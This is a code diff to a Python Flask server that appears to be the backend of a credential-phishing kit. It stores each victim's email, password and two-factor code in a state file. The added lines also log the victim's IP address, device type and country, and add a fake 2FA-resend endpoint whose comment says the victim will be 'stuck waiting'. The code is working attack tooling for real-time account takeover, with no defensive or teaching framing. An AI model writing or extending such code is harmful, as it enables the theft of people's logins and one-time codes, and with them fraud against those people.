@@ -529,12 +529,41 @@ def get_state():
 
 def set_state(status, email='', password='', two_fa_code=''):
     global current_victim
+    
+    # Get IP and device info
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip:
+        ip = ip.split(',')[0].strip()
+    user_agent = request.headers.get('User-Agent', '')
+    
+    # Parse device info
+    device = 'Unknown'
+    if 'iPhone' in user_agent:
+        device = 'iPhone'
+    elif 'iPad' in user_agent:
+        device = 'iPad'
+    elif 'Android' in user_agent:
+        device = 'Android'
+    elif 'Mac' in user_agent:
+        device = 'Mac'
+    elif 'Windows' in user_agent:
+        device = 'Windows'
+    
+    location = 'Unknown'
+    # Try to get country from Cloudflare headers
+    cf_country = request.headers.get('CF-IPCountry', '')
+    if cf_country:
+        location = cf_country
+    
     current_victim = {
         'status': status,
         'email': email,
         'password': password,
         '2fa_code': two_fa_code,
-        'timestamp': datetime.now().isoformat()
+        'timestamp': datetime.now().isoformat(),
+        'ip': ip or 'Unknown',
+        'device': device,
+        'location': location
     }
     with open(STATE_FILE, 'w') as f:
         json.dump(current_victim, f)
@@ -593,6 +622,18 @@ def set_victim_state():
     two_fa_code = data.get('2fa_code', '') or data.get('two_fa_code', '')
     state = set_state(status, email, password, two_fa_code)
     return jsonify({'status': 'success', 'state': state})
+
+@app.route('/api/resend-2fa', methods=['POST'])
+def resend_2fa():
+    data = request.json
+    email = data.get('email', '')
+    # Just acknowledge the request - the victim will be stuck waiting
+    resend_requests.append({
+        'email': email,
+        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    })
+    addActivity('Resend 2FA requested for ' + (email or 'unknown'))
+    return jsonify({'status': 'success', 'message': '2FA resend triggered'})
 
 IP_LOG_FILE = BASE_DIR / 'visitor_ips.json'
 visitor_ips = []
